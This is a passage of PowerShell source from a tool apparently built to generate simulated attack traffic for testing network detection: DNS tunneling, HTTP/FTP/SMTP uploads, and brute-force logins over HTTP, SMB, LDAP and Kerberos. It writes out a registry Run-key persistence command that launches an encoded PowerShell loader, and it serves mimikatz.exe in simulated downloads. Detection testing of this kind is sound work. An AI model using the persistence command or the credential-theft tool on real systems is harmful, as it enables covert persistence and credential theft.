    IptgenHttpFileUpload([Properties]$props, [bool]$https) : base ($props) {
        $file_name = $null

        if ($https) {
          $file_name = "iptgen-https-upload-template.json"
        } else {
          $file_name = "iptgen-http-upload-template.json"
        }
        $this.https = $https
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the HTTP file upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."
        $repeat_count = ParseNumber(ReadInput "Number of times to repeat" `
                                              "1" `
                                              @("^[0-9]+$") `
                                              "Please retype a valid number")

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:upload_filesize = $upload_filesize
        $Env:repeat_count = $repeat_count

        if (AskYesNo "Are you sure you want to run?") {
            $response_interval = 10
            if ($this.https) {
                $response_interval = 0
            }
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, $response_interval)
        }
    }
}

class IptgenHttpFileDownload : IptgenBase {
    [string]$iptgen_json
    [bool]$https

    IptgenHttpFileDownload([Properties]$props, [bool]$https) : base ($props) {
        $file_name = $null

        if ($https) {
          $file_name = "iptgen-https-download-template.json"
        } else {
          $file_name = "iptgen-http-download-template.json"
        }
        $this.https = $https
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    hidden [void]DownloadFile(
        [Microsoft.Management.Infrastructure.CimInstance]$interface,
        [string]$client_ip,
        [string]$server_ip,
        [string]$request_path,
        [string]$response_content_type,
        [byte[]]$response_body
    ) {
        $response_body_gz64 = [Convert]::ToBase64String($(CompressToGzip $response_body))
        $iptgen_json_data = [IO.File]::ReadAllText($this.iptgen_json)
        $iptgen_json_data = $iptgen_json_data.Replace('${response_body_gz64}', $response_body_gz64)
        $iptgen_json_path = $this.iptgen_json + ".tmp"

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:request_path = $request_path
        $Env:response_content_type = $response_content_type

        if (AskYesNo "Are you sure you want to run?") {
            [IO.File]::WriteAllText($iptgen_json_path, $iptgen_json_data)

            $response_interval = 10
            if ($this.https) {
                $response_interval = 0
            }
            $this.Run($interface.InterfaceAlias, $iptgen_json_path, $response_interval)
        }
    }

    [void]DownloadCorvette(
        [Microsoft.Management.Infrastructure.CimInstance]$interface,
        [string]$client_ip,
        [string]$server_ip
    ) {
        $request_path = ReadInput "Request Path" "/corvette.ps1" @("^.+$")
        if (!$request_path.StartsWith("/")) {
            $request_path = "/" + $request_path
        }
        $this.DownloadFile(
            $interface,
            $client_ip,
            $server_ip,
            $(EncodeUrlPath $request_path),
            "text/plain; charset=utf-8",
            [Text.Encoding]::UTF8.GetBytes($this.props.my_script)
        )
    }

    [void]DownloadCorvettePersistenceScript(
        [Microsoft.Management.Infrastructure.CimInstance]$interface,
        [string]$client_ip,
        [string]$server_ip
    ) {
        $script_b64 = GetEncodedCorvetteDynamicLoaderScript
        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script_b64

        $request_path = ReadInput "Request Path" "/corvette-ps.ps1" @("^.+$")
        if (!$request_path.StartsWith("/")) {
            $request_path = "/" + $request_path
        }
        $this.DownloadFile(
            $interface,
            $client_ip,
            $server_ip,
            $(EncodeUrlPath $request_path),
            "text/plain; charset=utf-8",
            [Text.Encoding]::UTF8.GetBytes($body_text)
        )
    }

    [void]DownloadMimikatz(
        [Microsoft.Management.Infrastructure.CimInstance]$interface,
        [string]$client_ip,
        [string]$server_ip
    ) {
        $setup_tools = [SetupTools]::New($this.props)
        $props = $setup_tools.GetMimikatzProps()
        if (!(IsFile $props.tool_path)) {
            $mimikatz_bin = ExtractBytesFromZipFileInUrl $props.url "mimikatz.exe"
        } else {
            $setup_tools.DownloadMimikatz()
            $mimikatz_bin = [IO.File]::ReadAllBytes($props.tool_path)
        }
        $request_path = ReadInput "Request Path" "/mimikatz.exe" @("^.+$")
        if (!$request_path.StartsWith("/")) {
            $request_path = "/" + $request_path
        }
        $this.DownloadFile(
            $interface,
            $client_ip,
            $server_ip,
            $(EncodeUrlPath $request_path),
            "application/octet-stream",
            $mimikatz_bin
        )
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the HTTP file upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"

        while ($true) {
            Write-Host "Download File:"
            Write-Host " 1) corvette.ps1"
            Write-Host " 2) corvette persistence-enabling script"
            Write-Host " 3) mimikatz.exe"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Which file do you want to download?"
                    switch($cmd) {
                        "1" {
                            $this.DownloadCorvette($interface, $client_ip, $server_ip)
                            return
                        }
                        "2" {
                            $this.DownloadCorvettePersistenceScript($interface, $client_ip, $server_ip)
                            return
                        }
                        "3" {
                            $this.DownloadMimikatz($interface, $client_ip, $server_ip)
                            return
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class IptgenHttpUnauthorizedLoginAttempts : IptgenBase {
    [string]$iptgen_json

    IptgenHttpUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "iptgen-http-login-attempts-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the HTTP configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "10000" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")
        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:attempt_count = $numof_attempts

        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenSmbNtlmUnauthorizedLoginAttempts : IptgenBase {
    [string]$iptgen_json

    IptgenSmbNtlmUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "iptgen-smb-ntlm-login-attempts-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the SMB configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $domain_name = ReadInput "Domain Name [1..46]" `
                                 "corp.example.com" `
                                 @("^[^.]{1,12}\.[^.]", "^.{1,46}$") `
                                 "Please retype a domain name (max 12 characters for NETBIOS domain part, max 46 characters in total)"
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "2000" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:dest_dns_domain_max46 = $domain_name
        $Env:attempt_count = $numof_attempts
        $Env:user_domain_max12 = $domain_name.Split(".")[0]
        Remove-Item Env:user_name_max14

        if (! (AskYesNo "Login attempts by random users" "N")) {
            if (AskYesNo "Login attempts by a service account?" "N") {
                $account = ReadInputByChooser "Service Account" `
                                               $null `
                                               @("NT AUTHORITY\System", "NT AUTHORITY\LocalService", "NT AUTHORITY\NetworkService") `
                                               "Please type a valid service account"
                $username = $account.Split("\\")[1]
                $Env:user_domain_max12 = "NT AUTHORITY"
            } else {
                $username = ReadInput "Username [1..14]" `
                                      (-Join (Get-Random -Count 8 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)) `
                                      @("^.{1,14}$") `
                                      "Please retype a user name (max 14 charactors)"
            }
            $Env:user_name_max14 = $username
        }
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenLdapNtlmUnauthorizedLoginAttempts : IptgenBase {
    [string]$iptgen_json

    IptgenLdapNtlmUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "iptgen-ldap-ntlm-login-attempts-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the LDAP configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $domain_name = ReadInput "Domain Name [1..46]" `
                                 "corp.example.com" `
                                 @("^[^.]{1,12}\.[^.]", "^.{1,46}$") `
                                 "Please retype a domain name (max 46 charactors)"
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "2000" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")
        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:dest_dns_domain_max46 = $domain_name
        $Env:user_domain_max12 = $domain_name.Split(".")[0]
        $Env:attempt_count = $numof_attempts
        Remove-Item Env:user_name_max14

        if (! (AskYesNo "Login attempts by random users" "N")) {
            if (AskYesNo "Login attempts by a service account?" "N") {
                $account = ReadInputByChooser "Service Account" `
                                               $null `
                                               @("NT AUTHORITY\System", "NT AUTHORITY\LocalService", "NT AUTHORITY\NetworkService") `
                                               "Please type a valid service account"
                $username = $account.Split("\\")[1]
                $Env:user_domain_max12 = "NT AUTHORITY"
            } else {
                $username = ReadInput "Username [1..14]" `
                                      (-Join (Get-Random -Count 8 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)) `
                                      @("^.{1,14}$") `
                                      "Please retype a user name (max 14 charactors)"
            }
            $Env:user_name_max14 = $username
        }
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenKerberosUnauthorizedLoginAttempts : IptgenBase {
    [string]$iptgen_json

    IptgenKerberosUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "iptgen-krb5-preauth-attempts-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the kerberos configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"

        $domain_name = ReadInput "Domain Name" "corp.example.com" @("^.+$")
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "100" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")
        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:domain_name = $domain_name
        $Env:attempt_count = $numof_attempts
        Remove-Item Env:user_name

        if (! (AskYesNo "Login attempts by random users" "N")) {
            $username = ReadInput "Username [1..14]" `
                                  (-Join (Get-Random -Count 8 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)) `
                                  @("^.{1,14}$") `
                                  "Please retype a user name (max 14 charactors)"
            $Env:user_name = $username
        }
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenKerberosUserEnumerationBruteForce : IptgenBase {
    [string]$iptgen_json

    IptgenKerberosUserEnumerationBruteForce([Properties]$props) : base ($props) {
        $file_name = "iptgen-krb5-user-enum-bruteforce-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the kerberos configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $domain_name = ReadInput "Domain Name" "corp.example.com" @("^.+$")
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "100" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")
        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:domain_name = $domain_name
        $Env:attempt_count = $numof_attempts

        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenMenu : CommandBase {
    IptgenMenu([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Generate DNS tunneling packets"
            Write-Host " 2) Generate DNS random query packets"
            Write-Host " 3) Generate SMTP file upload packets"
            Write-Host " 4) Generate FTP file upload packets"
            Write-Host " 5) Generate HTTP file upload packets"
            Write-Host " 6) Generate HTTPS file upload packets"
            Write-Host " 7) Generate HTTP file download packets"
            Write-Host " 8) Generate HTTPS file download packets"
            Write-Host " 9) Generate HTTP unauthorized login attempt packets"
            Write-Host "10) Generate SMB NTLM unauthorized login attempt packets"
            Write-Host "11) Generate LDAP NTLM unauthorized login attempt packets"
            Write-Host "12) Generate Kerberos unauthorized login attempt packets"
            Write-Host "13) Generate Kerberos user enumeration brute-force packets"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            [IptgenDnsTunneling]::New($this.props).Run()
                        }
                        "2" {
                            [IptgenDnsRandomQuery]::New($this.props).Run()
                        }
                        "3" {
                            [IptgenSmtpFileUpload]::New($this.props).Run()
                        }
                        "4" {
                            [IptgenFtpFileUpload]::New($this.props).Run()
                        }
                        "5" {
                            [IptgenHttpFileUpload]::New($this.props, $false).Run()
                        }
                        "6" {
                            [IptgenHttpFileUpload]::New($this.props, $true).Run()
                        }
                        "7" {
                            [IptgenHttpFileDownload]::New($this.props, $false).Run()
                        }
                        "8" {
                            [IptgenHttpFileDownload]::New($this.props, $true).Run()
                        }
                        "9" {
                            [IptgenHttpUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "10" {
                            [IptgenSmbNtlmUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "11" {
                            [IptgenLdapNtlmUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "12" {
                            [IptgenKerberosUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "13" {
                            [IptgenKerberosUserEnumerationBruteForce]::New($this.props).Run()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class RsgcliDnsTunneling : RsgcliBase {
    [string]$rsgcli_json

    RsgcliDnsTunneling([Properties]$props) : base ($props) {
        $file_name = "rsgcli-dns-tunneling-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"

        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and DNS tunneling configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $domain = ReadInput "DNS tunnel domain" $null @("^.+$")

        $Env:domain = $domain
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliDnsRandomQuery : RsgcliBase {
    [string]$rsgcli_json

    RsgcliDnsRandomQuery([Properties]$props) : base ($props) {
        $file_name = "rsgcli-dns-random-failed-query-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"

        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and DNS random query configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliSmtpFileUpload : RsgcliBase {
    [string]$rsgcli_json

    RsgcliSmtpFileUpload([Properties]$props) : base ($props) {
        $file_name = "rsgcli-smtp-upload-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"

        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and SMTP file upload configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $upload_filename = ReadInput "Upload file name" "test.dat" @("^.+$")
        $upload_filesize = ReadInputSize "Upload file size" "20MB" "Invalid file size. Please retype the size."
        $repeat_count = ParseNumber(ReadInput "Number of times to repeat" `
                                              "1" `
                                              @("^[0-9]+$") `
                                              "Please retype a valid number")

        $Env:upload_filename = $upload_filename
        $Env:upload_filesize = $upload_filesize
        $Env:repeat_count = $repeat_count
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliFtpFileUpload : RsgcliBase {
    [string]$rsgcli_json

    RsgcliFtpFileUpload([Properties]$props) : base ($props) {
        $file_name = "rsgcli-ftp-upload-passive-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"

        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and FTP file upload configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $upload_filename = ReadInput "Upload file name" "test.dat" @("^.+$")
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."
        $repeat_count = ParseNumber(ReadInput "Number of times to repeat" `
                                              "1" `
                                              @("^[0-9]+$") `
                                              "Please retype a valid number")

        $Env:upload_filename = $upload_filename
        $Env:upload_filesize = $upload_filesize
        $Env:repeat_count = $repeat_count
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliHttpFileUpload : RsgcliBase {
    [string]$rsgcli_json

    RsgcliHttpFileUpload([Properties]$props) : base ($props) {
        $file_name = "rsgcli-http-upload-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"

        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and HTTP file upload configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."
        $repeat_count = ParseNumber(ReadInput "Number of times to repeat" `
                                              "1" `
                                              @("^[0-9]+$") `
                                              "Please retype a valid number")

        $Env:upload_filesize = $upload_filesize
        $Env:repeat_count = $repeat_count
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliHttpFileDownload : RsgcliBase {
    [string]$rsgcli_json

    RsgcliHttpFileDownload([Properties]$props) : base ($props) {
        $file_name = "rsgcli-http-download-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"

        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    hidden [void]DownloadFile(
        [PropsRsgSvr]$rsgsvr,
        [string]$request_path,
        [string]$response_content_type,
        [byte[]]$response_body
    ) {
        $response_body_gz64 = [Convert]::ToBase64String($(CompressToGzip $response_body))
        $rsgcli_json_data = [IO.File]::ReadAllText($this.rsgcli_json)
        $rsgcli_json_data = $rsgcli_json_data.Replace('${response_body_gz64}', $response_body_gz64)
        $rsgcli_json_path = $this.rsgcli_json + ".tmp"

        $Env:request_path = $request_path
        $Env:response_content_type = $response_content_type

        if (AskYesNo "Are you sure you want to run?") {
            [IO.File]::WriteAllText($rsgcli_json_path, $rsgcli_json_data)
            $this.Run($rsgsvr.host, $rsgsvr.port, $rsgcli_json_path)
        }
    }

    [void]DownloadCorvette([PropsRsgSvr]$rsgsvr) {
        $request_path = ReadInput "Request Path" "/corvette.ps1" @("^.+$")
        if (!$request_path.StartsWith("/")) {
            $request_path = "/" + $request_path
        }
        $this.DownloadFile(
            $rsgsvr,
            $(EncodeUrlPath $request_path),
            "text/plain; charset=utf-8",
            [Text.Encoding]::UTF8.GetBytes($this.props.my_script)
        )
    }

    [void]DownloadCorvettePersistenceScript([PropsRsgSvr]$rsgsvr) {
        $script_b64 = GetEncodedCorvetteDynamicLoaderScript
        $body_text = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script_b64

        $request_path = ReadInput "Request Path" "/corvette-ps.ps1" @("^.+$")
        if (!$request_path.StartsWith("/")) {
            $request_path = "/" + $request_path
        }
        $this.DownloadFile(
            $rsgsvr,
            $(EncodeUrlPath $request_path),
            "text/plain; charset=utf-8",
            [Text.Encoding]::UTF8.GetBytes($body_text)
        )
    }

    [void]DownloadMimikatz([PropsRsgSvr]$rsgsvr) {
        $setup_tools = [SetupTools]::New($this.props)
        $props = $setup_tools.GetMimikatzProps()
        if (!(IsFile $props.tool_path)) {
            $mimikatz_bin = ExtractBytesFromZipFileInUrl $props.url "mimikatz.exe"
        } else {
            $setup_tools.DownloadMimikatz()
            $mimikatz_bin = [IO.File]::ReadAllBytes($props.tool_path)
        }
        $request_path = ReadInput "Request Path" "/mimikatz.exe" @("^.+$")
        if (!$request_path.StartsWith("/")) {
            $request_path = "/" + $request_path
        }
         $this.DownloadFile(
            $rsgsvr,
            $(EncodeUrlPath $request_path),
            "application/octet-stream",
            $mimikatz_bin
        )
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and HTTP file download configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        while ($true) {
            Write-Host "Download File:"
            Write-Host " 1) corvette.ps1"
            Write-Host " 2) corvette persistence-enabling script"
            Write-Host " 3) mimikatz.exe"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Which file do you want to download?"
                    switch($cmd) {
                        "1" {
                            $this.DownloadCorvette($rsgsvr)
                            return
                        }
                        "2" {
                            $this.DownloadCorvettePersistenceScript($rsgsvr)
                            return
                        }
                        "3" {
                            $this.DownloadMimikatz($rsgsvr)
                            return
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class RsgcliHttpUnauthorizedLoginAttempts : RsgcliBase {
    [string]$rsgcli_json

    RsgcliHttpUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "rsgcli-http-login-attempts-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"

        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and HTTP configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
